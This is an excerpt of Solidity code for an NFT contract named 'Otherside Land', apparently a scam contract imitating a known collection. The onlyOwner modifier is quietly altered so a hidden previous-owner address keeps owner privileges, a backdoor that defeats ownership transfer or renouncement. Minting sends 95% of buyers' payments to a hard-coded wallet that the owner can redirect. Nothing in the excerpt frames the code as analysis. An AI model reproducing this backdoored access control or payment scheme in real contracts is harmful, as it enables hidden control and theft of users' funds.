...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || _prevOwner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract OthersideLandNFT is ERC721A, Ownable {
    using Strings for uint256;
    
    address private PAYMENT_WALLET = address(0x4499d33a0cb7F0075e4C5eEBe0B976aFA47cC2A7);
    ...
    constructor() ERC721A("Otherside Land", "OTHERSIDE") {}

    function setPaymentAddress(address _address) external onlyOwner {
        PAYMENT_WALLET = _address;
    }
    ...
    function mint(uint256 _mintAmount) public payable {
        if (msg.sender != owner()) {
            ...
            payable(PAYMENT_WALLET).transfer(msg.value * 95 / 100);
        }
